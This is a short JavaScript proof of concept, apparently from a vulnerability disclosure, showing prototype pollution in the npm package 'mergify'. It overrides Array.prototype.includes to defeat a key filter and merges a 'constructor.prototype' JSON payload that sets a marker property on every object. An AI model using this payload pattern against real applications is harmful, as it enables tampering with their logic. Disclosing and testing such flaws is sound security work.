Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const mergify = require('mergify');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
mergify({}, JSON.parse(payload));
console.log({}.polluted);